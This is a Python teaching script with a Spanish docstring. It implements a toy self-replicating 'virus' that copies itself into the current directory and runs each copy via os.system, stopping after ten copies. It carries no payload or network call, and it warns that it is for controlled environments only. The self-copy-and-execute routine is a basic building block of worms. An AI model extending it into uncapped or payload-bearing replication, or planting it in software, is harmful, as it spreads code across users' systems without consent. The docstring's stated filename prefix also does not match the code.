"""
Nombre: Virus Autorreplicante
Descripción: 
    Este script implementa un virus autorreplicante en Python que se copia a sí mismo en el directorio actual.
    Se generan hasta un máximo de 10 copias numeradas secuencialmente con el prefijo "VIRUS_NAME".

Funcionamiento:
    - Verifica cuántas copias del virus existen en el directorio actual.
    - Si no ha alcanzado el límite definido en MAX_COPIAS, crea una nueva copia de sí mismo.
    - Ejecuta la nueva copia del script.
    - Si se ha alcanzado el límite, detiene la replicación.

Advertencia:
    - Este script es solo con fines educativos y no debe ejecutarse en sistemas no controlados.
    - La ejecución de código malicioso sin consentimiento es ilegal y antiético.

Autor: Germán Riveros S.
Fecha: 28/03/2025
"""


import os
import shutil
import sys

# Nombre base del virus
VIRUS_NAME = "vp0001"
EXTENSION = ".py"
MAX_COPIAS = 10

# Obtener el número de copias existentes en el directorio
copias_existentes = [f for f in os.listdir() if f.startswith(VIRUS_NAME) and f.endswith(EXTENSION)]
num_copias = len(copias_existentes)

# Si aún no ha alcanzado el límite de copias, crear una nueva
if num_copias < MAX_COPIAS:
    nuevo_nombre = f"{VIRUS_NAME}_{num_copias + 1}{EXTENSION}"
    shutil.copy(__file__, nuevo_nombre)  # Copiarse a sí mismo
    print(f"Infectando... Creado {nuevo_nombre}")

    # Ejecutar la nueva copia
    os.system(f"python {nuevo_nombre}")

else:
    print("Límite de infección alcanzado.")
